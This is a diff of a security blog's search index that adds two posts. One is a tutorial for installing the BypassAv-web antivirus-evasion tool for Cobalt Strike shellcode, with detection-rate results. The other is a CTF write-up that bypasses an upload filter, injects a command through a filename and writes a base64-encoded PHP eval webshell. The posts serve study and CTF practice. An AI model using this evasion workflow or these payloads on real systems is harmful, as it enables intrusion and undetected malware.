@@ -1095,12 +1095,6 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
       </categories>
   </entry>
   <entry>
-    <title>信息收集之Web Scraper爬取站长之家备案数据</title>
-    <url>/2021/04/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BWeb-Scraper%E7%88%AC%E5%8F%96%E7%AB%99%E9%95%BF%E4%B9%8B%E5%AE%B6%E5%A4%87%E6%A1%88%E6%95%B0%E6%8D%AE/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<a id="more"></a>]]></content>
-  </entry>
-  <entry>
     <title>Spring Boot Vulnerability Exploit Check List</title>
     <url>/2021/04/29/Spring-Boot-Vulnerability-Exploit-Check-List/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文转载自<a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey/SpringBootVulExploit</a>，在此膜拜大佬。</p>
@@ -2251,6 +2245,116 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
       </categories>
       <tags>
         <tag>Go</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记免杀工具BypassAv-web的安装过程</title>
+    <url>/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近期在GitHub看到nim一键免杀的项目，遂想测试一下，但是作者并没有提供部署教程，在踩了很多坑之后安装成功。</p>
+<p><a href="https://github.com/M-Kings/BypassAv-web">https://github.com/M-Kings/BypassAv-web</a></p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144207093.png"></p>
+<a id="more"></a>
+<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>本节是安装步骤的记录，如果仅是想安装部署项目可参考本节</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root</span><br><span class="line"># 下载代码库</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;M-Kings&#x2F;BypassAv-web.git</span><br><span class="line"></span><br><span class="line"># 起个Ubuntu的docker</span><br><span class="line">docker run -itd -p 8001:8000 -v &#x2F;root&#x2F;BypassAv-web&#x2F;:&#x2F;root&#x2F;BypassAv-web&#x2F; ubuntu</span><br><span class="line"></span><br><span class="line"># 进入docker容器，这里的4d是容器id，每次启动容器示例不一样，自己docker ps看一下</span><br><span class="line">docker exec -it 4d bash</span><br><span class="line"></span><br><span class="line"># 安装必备组件</span><br><span class="line">apt update</span><br><span class="line">apt install python3 python3-pip nim vim wget unzip mingw-w64</span><br><span class="line"></span><br><span class="line"># 进入代码所在目录</span><br><span class="line">cd &#x2F;root&#x2F;BypassAv-web&#x2F;</span><br><span class="line"># 创建两个必备目录，作者代码里并没有自动创建</span><br><span class="line">mkdir files</span><br><span class="line">mkdir temp</span><br><span class="line"></span><br><span class="line"># 作者代码里写了绝对路径，所以要去改一下</span><br><span class="line"># nim&#x2F;views.py 84行</span><br><span class="line">vim nim&#x2F;views.py</span><br><span class="line">原代码：</span><br><span class="line">yesxor &#x3D; os.popen(&#39;&#x2F;root&#x2F;FileService&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">修改为:</span><br><span class="line">yesxor &#x3D; os.popen(os.path.abspath(os.curdir) + &#39;&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">os.path.abspath(os.curdir)</span><br><span class="line"></span><br><span class="line"># 代码内调用该文件，需要赋予执行权限</span><br><span class="line">chmod 755 code&#x2F;testnim</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 安装nim的依赖库</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br><span class="line"></span><br><span class="line"># 回到主目录</span><br><span class="line">cd ..</span><br><span class="line">python3 manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure>
+
+<h3 id="排错过程"><a href="#排错过程" class="headerlink" title="排错过程"></a>排错过程</h3><p>本节是排错过程，如果有兴趣了解我是如何发现并解决安装过程出现的问题的，敬请阅读。</p>
+<h4 id="目录不存在的报错"><a href="#目录不存在的报错" class="headerlink" title="目录不存在的报错"></a>目录不存在的报错</h4><p>这个问题手动创建文件夹即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir files</span><br><span class="line">mkdir temp</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件不存在报错"><a href="#文件不存在报错" class="headerlink" title="文件不存在报错"></a>文件不存在报错</h4><p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142637535.png"></p>
+<p>查看代码，把输出打开，并把移除文件的代码注释掉，这样我们就可以手动调试生成的文件</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142258634.png"></p>
+<p>根据后端的报错，发现作者应该是有一处代码写了绝对路径，所以查找关键字发现view.py 84行处写了绝对路径</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142924309.png"></p>
+<p>然后简单修改为相对路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># view 84行</span><br><span class="line">vim nim&#x2F;views.py</span><br><span class="line">yesxor &#x3D; os.popen(&#39;&#x2F;root&#x2F;FileService&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">yesxor &#x3D; os.popen(os.path.abspath(os.curdir) + &#39;&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">os.path.abspath(os.curdir)</span><br></pre></td></tr></table></figure>
+
+<p>解决了上述问题，发现web端还是会报错，无法下载文件</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702111813948.png"></p>
+<p>本地执行nim编译命令，发现有报错</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702143347018.png"></p>
+<p>Google一番发现是nim编译时需要调用mingw32</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mingw-w64</span><br></pre></td></tr></table></figure>
+
+<p>然后再次编译发生如下错误</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702113844897.png"></p>
+<p>Google一下，原来是依赖库，根据官方说明安装一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nimble install winim</span><br></pre></td></tr></table></figure>
+
+<p>然后估计是网络不行还是什么问题，实际上会一直卡着，手动安装吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install wget</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">apt install unzip</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702114554231.png"></p>
+<p>这个时候再试试它的编译，能成功了</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702114714722.png"></p>
+<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>安装成功后，使用CS生成shellcode</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144819125.png"></p>
+<p>这里根据作者的说明是生成64位的RAW类型的shellcode</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702160620690.png"></p>
+<p>上线成功</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702160905962.png"></p>
+<p>本文编写于2021年7月2日，测试virustotal效果如下</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144316892.png"></p>
+<p>测试微步效果如下</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144359468.png"></p>
+<h3 id="进阶：重新编译testnim"><a href="#进阶：重新编译testnim" class="headerlink" title="进阶：重新编译testnim"></a>进阶：重新编译testnim</h3><p>阅读了源码，作者使用了testnim对shellcode进行了异或加密，作者提供了testnim的二进制文件它的源码testnim.nim，那么便尝试一下从源码编译testnim</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd code&#x2F;</span><br><span class="line">nim c -o&#x3D;testnim testnim.nim</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702162101828.png"></p>
+<p>编译成功且测试运行成功</p>
+<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702162128439.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一道限制长度命令执行的CTF解题过程</title>
+    <url>/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一道文件上传题，限制了上传内容长度小于15个字符，且校验文件头，上传文件拓展名采用黑名单限制，最终使用了一个巧妙的方法成功getshell。</p>
+<a id="more"></a>
+<h3 id="一顿操作拿flag"><a href="#一顿操作拿flag" class="headerlink" title="一顿操作拿flag"></a>一顿操作拿flag</h3><p>首先题目打开后页面如下，扫描了一下目录未发现其它文件<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-45-39.png"></p>
+<p>上传一张图片，提示长度不能大于等于15<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-57-58.png"></p>
+<p>然后把文件内容改短一点，可以看到是会校验文件内容的<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-59-42.png"></p>
+<p>用常用的文件头可以绕过，如<code>GIF89A</code><br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-02-28.png"></p>
+<p>然后再测测文件名，发现<code>php</code>后缀是会拦截<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-49-44.png"></p>
+<p>简单测试发现是黑名单，那就简单的<code>pht/phtml</code>等多种拓展名可绕过<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-04-32.png"></p>
+<p>因为限制了长度，所以使用<code>php短标签</code>，<code>php标签</code>不闭合也能执行，可以尽可能缩短内容长度<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-08-51.png"></p>
+<p>然后根据返回的文件路径，访问文件，可以看到php代码确实执行了<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-10-08.png"></p>
+<p>再想执行稍长一点的命令，发现已经超长了，所以接下来的问题就是缩短文件内容长度<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-13-08.png"></p>
+<p>测试发现仅使用<code>GIF</code>作为文件头也能成功绕过文件头校验<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-14-54.png"></p>
+<p>然后居然就这么看到疑似flag的东西，提交上去是对的？？？<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-16-20.png"></p>
+<h3 id="进阶getshell"><a href="#进阶getshell" class="headerlink" title="进阶getshell"></a>进阶getshell</h3><p>看到这个flag我不禁陷入沉思，题目这么出有什么意思？？？这不是单纯恶心人么？？？</p>
+<p>于是想是否还有其它方式能够绕过长度拦截，从而getshell呢？</p>
+<p>既然文件内容长度是有限制的，但是文件名确没有限制，那么是否能通过控制文件名来执行想要的命令呢？</p>
+<p>于是研究起linux命令，发现<code>sh -c *</code>可以让<strong>当前目录的文件名作为命令执行</strong></p>
+<p>本地生成一个名为<code>whoami</code>的文件，使用<code>sh -c *</code>命令可以看到把文件名作为命令执行了<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-27-48.png"></p>
+<p>因为<code>sh -c </code>本身就会把<code>-c</code>的值作为命令执行，<code>*</code>号统配符代表了当前目录所有的文件名，所以便执行成功<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-31-14.png"></p>
+<p>根据这个思路，构造文件内容，发现长度超了，16位整好超一位<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-34-15.png"></p>
+<p>于是测试其它文件头，发现<code>BM</code>可用<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-39-28.png"></p>
+<p>接下来便是构造文件名了，我们既要文件名后缀为php可执行的<code>.pht</code>，又要执行命令，可用使用<code>;</code>号来分割命令，先试试<code>whoami;.pht</code>，通过<code>;</code>号分割后，即便后面的<code>.pht</code>不能正常执行也不影响前面的命令执行<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-12-42.png"></p>
+<p>访问文件看到执行成功了<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-11-22.png"></p>
+<p>然后就是写shell，因为要写到文件名所以把文件内容base64编码一下再通过重定向写入文件<code>1.pht</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d &gt;1.pht;.pht</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-13-32.png"></p>
+<p>发送上传包，成功写入这个畸形的文件名及内容<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-19-39.png"></p>
+<p>接下来要访问一下，才能让它执行并生成<code>1.pht</code>，这里需要把空格URL编码，然后200访问成功<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-21-11.png"></p>
+<p>再访问一下上传命令的<code>1.pht</code>，200访问成功<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-22-08.png"></p>
+<p>然后就拿个webshell连接工具就行了，这里用的是蚁剑<br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-23-49.png"><br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-24-50.png"><br><img data-src="/2021/07/16/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-25-17.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文介绍了一种限制上传文件内容长度的绕过思路，如有雷同，纯粹巧合。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
